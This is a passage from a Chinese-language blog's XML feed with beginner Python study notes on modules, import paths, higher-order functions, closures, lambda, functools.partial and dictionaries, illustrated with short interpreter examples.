..., &#39;&#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.6&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#39;]</span><br></pre></td></tr></table></figure><h4 id="要添加自己的搜索目录，有两种方法："><a href="#要添加自己的搜索目录，有两种方法：" class="headerlink" title="要添加自己的搜索目录，有两种方法："></a>要添加自己的搜索目录，有两种方法：</h4><p>一是直接修改<code>sys.path</code>，添加要搜索的目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.path.append(&#39;&#x2F;Users&#x2F;michael&#x2F;my_py_scripts&#39;)</span><br></pre></td></tr></table></figure><p>这种方法是在运行时修改，运行结束后失效。</p><p>​    第二种方法是设置环境变量<code>PYTHONPATH</code>，该环境变量的内容会被自动添加到模块搜索路径中。设置方式与设置Path环境变量类似。注意只需要添加你自己的搜索路径，Python自己本身的搜索路径不受影响。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;导入模块-import-xx&quot;&gt;&lt;a href=&quot;#导入模块-import-xx&quot; class=&quot;headerlink&quot; title=&quot;导入模块 import xx&quot;&gt;&lt;/a&gt;导入模块 import xx&lt;/h2&gt;&lt;figure class=&quot;highlight </summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="学习" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/03/26/%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>http://example.com/2021/03/26/%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8/</id>
    <published>2021-03-26T12:11:48.085Z</published>
    <updated>2021-03-26T12:07:13.683Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/03/26/%E6%A8%A1%E5%9D%971/"/>
    <id>http://example.com/2021/03/26/%E6%A8%A1%E5%9D%971/</id>
    <published>2021-03-26T12:11:48.061Z</published>
    <updated>2021-03-26T12:07:23.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="导入模块-import-xx"><a href="#导入模块-import-xx" class="headerlink" title="导入模块 import xx"></a>导入模块 import xx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>​    当我们在命令行运行<code>hello</code>模块文件时，Python解释器把一个特殊变量<code>__name__</code>置为<code>__main__</code>，而如果在其他地方导入该<code>hello</code>模块时，<code>if</code>判断将失败，因此，这种<code>if</code>测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的就是运行测试。</p><p>​    类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的（private），不应该被直接引用，比如<code>_abc</code>，<code>__abc</code>等</p><h3 id="外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。"><a href="#外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。" class="headerlink" title="外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。"></a>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</h3><h1 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h1><p>​    Windows确保安装时勾选了<code>pip</code>和<code>Add python.exe to Path</code></p><p>​    命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install 模块名</span><br></pre></td></tr></table></figure><p>​    推荐直接使用<a href="https://www.anaconda.com/">Anaconda</a>，内置了许多非常有用的第三方库，装上Anaconda，就相当于把数十个第三方模块自动安装好</p><h3 id="模块搜索路径"><a href="#模块搜索路径" class="headerlink" title="模块搜索路径"></a>模块搜索路径</h3><p>​    当我们试图加载一个模块时，Python会在指定的路径下搜索对应的.py文件，如果找不到，就会报错</p><p>​    默认情况下，Python解释器会搜索当前目录、所有已安装的内置模块和第三方模块，搜索路径存放在<code>sys</code>模块的<code>path</code>变量中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.path</span><br><span class="line">[&#39;&#39;, &#39;&#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.6&#x2F;lib&#x2F;python36.zip&#39;, &#39;&#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.6&#x2F;lib&#x2F;python3.6&#39;, ..., &#39;&#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.6&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#39;]</span><br></pre></td></tr></table></figure><h4 id="要添加自己的搜索目录，有两种方法："><a href="#要添加自己的搜索目录，有两种方法：" class="headerlink" title="要添加自己的搜索目录，有两种方法："></a>要添加自己的搜索目录，有两种方法：</h4><p>一是直接修改<code>sys.path</code>，添加要搜索的目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.path.append(&#39;&#x2F;Users&#x2F;michael&#x2F;my_py_scripts&#39;)</span><br></pre></td></tr></table></figure><p>这种方法是在运行时修改，运行结束后失效。</p><p>​    第二种方法是设置环境变量<code>PYTHONPATH</code>，该环境变量的内容会被自动添加到模块搜索路径中。设置方式与设置Path环境变量类似。注意只需要添加你自己的搜索路径，Python自己本身的搜索路径不受影响。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;导入模块-import-xx&quot;&gt;&lt;a href=&quot;#导入模块-import-xx&quot; class=&quot;headerlink&quot; title=&quot;导入模块 import xx&quot;&gt;&lt;/a&gt;导入模块 import xx&lt;/h2&gt;&lt;figure class=&quot;highlight </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/03/26/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    <id>http://example.com/2021/03/26/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</id>
    <published>2021-03-26T12:11:48.048Z</published>
    <updated>2021-03-26T11:46:07.496Z</updated>
    
    <content type="html"><![CDATA[<h2 id="高级函数"><a href="#高级函数" class="headerlink" title="高级函数"></a>高级函数</h2><p>Q：函数本身赋值给变量呢？</p><p>A：函数本身也可以赋值给变量，即：变量可以指向函数。</p><p>​    函数名也是变量，把函数名指向其他对象，函数名()就不能执行函数体</p><h2 id="传入函数"><a href="#传入函数" class="headerlink" title="传入函数"></a>传入函数</h2><p>​    一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。</p><p>一个最简单的高阶函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def add(x, y, f):</span><br><span class="line">    return f(x) + f(y)</span><br></pre></td></tr></table></figure><p>当我们调用<code>add(-5, 6, abs)</code>时，参数<code>x</code>，<code>y</code>和<code>f</code>分别接收<code>-5</code>，<code>6</code>和<code>abs</code>，根据函数定义，我们可以推导计算过程为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x &#x3D; -5</span><br><span class="line">y &#x3D; 6</span><br><span class="line">f &#x3D; abs</span><br><span class="line">f(x) + f(y) &#x3D;&#x3D;&gt; abs(-5) + abs(6) &#x3D;&#x3D;&gt; 11</span><br><span class="line">return 11</span><br></pre></td></tr></table></figure><h1 id="map-reduce"><a href="#map-reduce" class="headerlink" title="map/reduce"></a>map/reduce</h1><p>​    <code>map()</code>函数接收两个参数，一个是函数，一个是<code>Iterable</code>，<code>map</code>将传入的函数依次作用到序列的每个元素，并把结果作为新的<code>Iterator</code>返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def f(x):</span><br><span class="line">...     return x * x</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; r &#x3D; map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">&gt;&gt;&gt; list(r)</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure><p>把这个list所有数字转为字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(map(str, [1, 2, 3, 4, 5, 6, 7, 8, 9]))</span><br><span class="line">[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;]</span><br></pre></td></tr></table></figure><p>​    <code>reduce</code>把一个函数作用在一个序列<code>[x1, x2, x3, ...]</code>上，这个函数必须接收两个参数</p><p>对一个序列求和，就可以用<code>reduce</code>实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from functools import reduce</span><br><span class="line">&gt;&gt;&gt; def add(x, y):</span><br><span class="line">...     return x + y</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; reduce(add, [1, 3, 5, 7, 9])</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>当然求和运算可以直接用Python内建函数<code>sum()</code>，没必要动用<code>reduce</code>。</p><p>但是如果要把序列<code>[1, 3, 5, 7, 9]</code>变换成整数<code>13579</code>，<code>reduce</code>就可以派上用场：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from functools import reduce</span><br><span class="line">&gt;&gt;&gt; def fn(x, y):</span><br><span class="line">...     return x * 10 + y</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; reduce(fn, [1, 3, 5, 7, 9])</span><br><span class="line">13579</span><br></pre></td></tr></table></figure><h1 id="filter-筛选"><a href="#filter-筛选" class="headerlink" title="filter()  筛选"></a>filter()  筛选</h1><p>​    <code>filter()</code>也接收一个函数和一个序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。</p><p>例如，在一个list中，删掉偶数，只保留奇数，可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 &#x3D;&#x3D; 1</span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure><p>把一个序列中的空字符串删掉，可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def not_empty(s):</span><br><span class="line">    return s and s.strip()</span><br><span class="line"></span><br><span class="line">list(filter(not_empty, [&#39;A&#39;, &#39;&#39;, &#39;B&#39;, None, &#39;C&#39;, &#39;  &#39;]))</span><br><span class="line"># 结果: [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;]</span><br></pre></td></tr></table></figure><h1 id="sorted-排序"><a href="#sorted-排序" class="headerlink" title="sorted  排序"></a>sorted  排序</h1><p><code>sorted()</code>函数就可以对list进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([36, 5, -12, 9, -21])</span><br><span class="line">[-21, -12, 5, 9, 36]</span><br></pre></td></tr></table></figure><p>​    以接收一个<code>key</code>函数来实现自定义的排序，例如按绝对值大小排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key&#x3D;abs)</span><br><span class="line">[5, 9, -12, -21, 36]</span><br></pre></td></tr></table></figure><p><strong>字符串排序</strong></p><p>​    默认情况下，对字符串排序，是按照ASCII的大小比较的，由于<code>&#39;Z&#39; &lt; &#39;a&#39;</code>，结果，大写字母<code>Z</code>会排在小写字母<code>a</code>的前面。</p><p>给<code>sorted</code>传入key函数，即可实现忽略大小写的排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([&#39;bob&#39;, &#39;about&#39;, &#39;Zoo&#39;, &#39;Credit&#39;], key&#x3D;str.lower)</span><br><span class="line">[&#39;about&#39;, &#39;bob&#39;, &#39;Credit&#39;, &#39;Zoo&#39;]</span><br></pre></td></tr></table></figure><p>要进行反向排序，不必改动key函数，可以传入第三个参数<code>reverse=True</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([&#39;bob&#39;, &#39;about&#39;, &#39;Zoo&#39;, &#39;Credit&#39;], key&#x3D;str.lower, reverse&#x3D;True)</span><br><span class="line">[&#39;Zoo&#39;, &#39;Credit&#39;, &#39;bob&#39;, &#39;about&#39;]</span><br></pre></td></tr></table></figure><h1 id="返回函数"><a href="#返回函数" class="headerlink" title="返回函数"></a>返回函数</h1><p>​    高阶函数除了可以接受函数作为参数外，还可以<strong>把函数作为结果值返回</strong></p><p>​    返回求和的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def lazy_sum(*args):</span><br><span class="line">    def sum():</span><br><span class="line">        ax &#x3D; 0</span><br><span class="line">        for n in args:</span><br><span class="line">            ax &#x3D; ax + n</span><br><span class="line">        return ax</span><br><span class="line">    return sum</span><br></pre></td></tr></table></figure><p>当我们调用<code>lazy_sum()</code>时，返回的并不是求和结果，而是求和函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f &#x3D; lazy_sum(1, 3, 5, 7, 9)</span><br><span class="line">&gt;&gt;&gt; f</span><br><span class="line">&lt;function lazy_sum.&lt;locals&gt;.sum at 0x101c6ed90&gt;</span><br></pre></td></tr></table></figure><p>调用函数<code>f</code>时，才真正计算求和的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f()</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>​    在函数<code>lazy_sum</code>中又定义了函数<code>sum</code>，并且，内部函数<code>sum</code>可以引用外部函数<code>lazy_sum</code>的参数和局部变量，当<code>lazy_sum</code>返回函数<code>sum</code>时，相关参数和变量都保存在返回的函数中，这种称为<strong>闭包</strong></p><p><strong>每次调用都会返回一个新的函数</strong></p><h3 id="返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。"><a href="#返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。" class="headerlink" title="返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。"></a>返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。</h3><p>​    如果一<strong>定要引用循环变量</strong>怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def count():</span><br><span class="line">    def f(j):</span><br><span class="line">        def g():</span><br><span class="line">            return j*j</span><br><span class="line">        return g</span><br><span class="line">    fs &#x3D; []</span><br><span class="line">    for i in range(1, 4):</span><br><span class="line">        fs.append(f(i)) # f(i)立刻被执行，因此i的当前值被传入f()</span><br><span class="line">    return fs</span><br></pre></td></tr></table></figure><p>再看看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f1, f2, f3 &#x3D; count()</span><br><span class="line">&gt;&gt;&gt; f1()</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; f2()</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; f3()</span><br><span class="line">9</span><br></pre></td></tr></table></figure><h1 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h1><p>​    关键字<code>lambda</code>表示匿名函数，冒号前面的<code>x</code>表示函数参数。</p><p>匿名函数有个限制，就是只能有一个表达式，不用写<code>return</code>，返回值就是该表达式的结果。</p><p>用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f &#x3D; lambda x: x * x</span><br><span class="line">&gt;&gt;&gt; f</span><br><span class="line">&lt;function &lt;lambda&gt; at 0x101c6ef28&gt;</span><br><span class="line">&gt;&gt;&gt; f(5)</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>同样，也可以把匿名函数作为返回值返回，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def build(x, y):</span><br><span class="line">    return lambda: x * x + y * y</span><br></pre></td></tr></table></figure><h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><h1 id="偏函数"><a href="#偏函数" class="headerlink" title="偏函数"></a>偏函数</h1><p>​    <code>functools</code>模块提供了很多有用的功能，其中一个就是偏函数（Partial function）</p><p>​    <code>int()</code>函数还提供额外的<code>base</code>参数，默认值为<code>10</code>。如果传入<code>base</code>参数，就可以做N进制的转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(&#39;12345&#39;, base&#x3D;8)</span><br><span class="line">5349</span><br><span class="line">&gt;&gt;&gt; int(&#39;12345&#39;, 16)</span><br><span class="line">74565</span><br></pre></td></tr></table></figure><p>​    <code>functools.partial</code>就是帮助我们创建一个偏函数的，不需要我们自己定义<code>int2()</code>，可以直接使用下面的代码创建一个新的函数<code>int2</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import functools</span><br><span class="line">&gt;&gt;&gt; int2 &#x3D; functools.partial(int, base&#x3D;2)</span><br><span class="line">&gt;&gt;&gt; int2(&#39;1000000&#39;)</span><br><span class="line">64</span><br><span class="line">&gt;&gt;&gt; int2(&#39;1010101&#39;)</span><br><span class="line">85</span><br></pre></td></tr></table></figure><p>所以，简单总结<code>functools.partial</code>的作用就是，把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，调用这个新函数会更简单。</p><p>注意到上面的新的<code>int2</code>函数，仅仅是把<code>base</code>参数重新设定默认值为<code>2</code>，但也可以在函数调用时传入其他值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int2(&#39;1000000&#39;, base&#x3D;10)</span><br><span class="line">1000000</span><br></pre></td></tr></table></figure><p>最后，创建偏函数时，实际上可以接收函数对象、<code>*args</code>和<code>**kw</code>这3个参数，当传入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int2 &#x3D; functools.partial(int, base&#x3D;2)</span><br></pre></td></tr></table></figure><p>实际上固定了int()函数的关键字参数<code>base</code>，也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int2(&#39;10010&#39;)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kw &#x3D; &#123; &#39;base&#39;: 2 &#125;</span><br><span class="line">int(&#39;10010&#39;, **kw)</span><br></pre></td></tr></table></figure><p>当传入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max2 &#x3D; functools.partial(max, 10)</span><br></pre></td></tr></table></figure><p>实际上会把<code>10</code>作为<code>*args</code>的一部分自动加到左边，也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max2(5, 6, 7)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">args &#x3D; (10, 5, 6, 7)</span><br><span class="line">max(*args)</span><br></pre></td></tr></table></figure><p>结果为<code>10</code>。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>​    当函数的参数个数太多，需要简化时，使用<code>functools.partial</code>可以创建一个新的函数，这个新函数可以固定住原函数的部分参数，从而在调用时更简单。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;高级函数&quot;&gt;&lt;a href=&quot;#高级函数&quot; class=&quot;headerlink&quot; title=&quot;高级函数&quot;&gt;&lt;/a&gt;高级函数&lt;/h2&gt;&lt;p&gt;Q：函数本身赋值给变量呢？&lt;/p&gt;
&lt;p&gt;A：函数本身也可以赋值给变量，即：变量可以指向函数。&lt;/p&gt;
&lt;p&gt;​    函数</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/03/26/%E5%AD%97%E5%85%B8/"/>
    <id>http://example.com/2021/03/26/%E5%AD%97%E5%85%B8/</id>
    <published>2021-03-26T10:19:45.505Z</published>
    <updated>2021-03-26T06:12:41.030Z</updated>
    
    <content type="html"><![CDATA[<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&#39;Jack&#39;] &#x3D; 90</span><br><span class="line">&gt;&gt;&gt; d[&#39;Jack&#39;]</span><br><span class="line">90</span><br><span class="line">&gt;&gt;&gt; d[&#39;Jack&#39;] &#x3D; 88</span><br><span class="line">&gt;&gt;&gt; d[&#39;Jack&#39;]</span><br><span class="line">88</span><br></pre></td></tr></table></figure><p>如果key不存在，dict就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&#39;Thomas&#39;]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &#39;Thomas&#39;</span><br></pre></td></tr></table></figure><p>要避免key不存在的错误，有两种办法，一是通过<code>in</code>判断key是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;Thomas&#39; in d</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>二是通过dict提供的<code>get()</code>方法，如果key不存在，可以返回<code>None</code>，或者自己指定的value：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.get(&#39;Thomas&#39;)</span><br><span class="line">&gt;&gt;&gt; d.get(&#39;Thomas&#39;, -1)</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><p>要删除一个key，用<code>pop(key)</code>方法，对应的value也会从dict中删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.pop(&#39;Bob&#39;)</span><br><span class="line">75</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#39;Michael&#39;: 95, &#39;Tracy&#39;: 85&#125;</span><br></pre></td></tr></table></figure><p>请务必注意，dict内部存放的顺序和key放入的顺序是没有关系的。</p><p>和list比较，dict有以下几个特点：</p><ol><li>查找和插入的速度极快，不会随着key的增加而变慢；</li><li>需要占用大量的内存，内存浪费多。</li></ol><p>而list相反：</p><ol><li>查找和插入的时间随着元素的增加而增加；</li><li>占用空间小，浪费内存很少。</li></ol><p>dict的key必须是<strong>不可变对象</strong></p><p>​    在Python中，字符串、整数等都是不可变的，因此，可以放心地作为key。而list是可变的，就不能作为key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; key &#x3D; [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; d[key] &#x3D; &#39;a list&#39;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: unhashable type: &#39;list&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    
  </entry>
  
</feed>
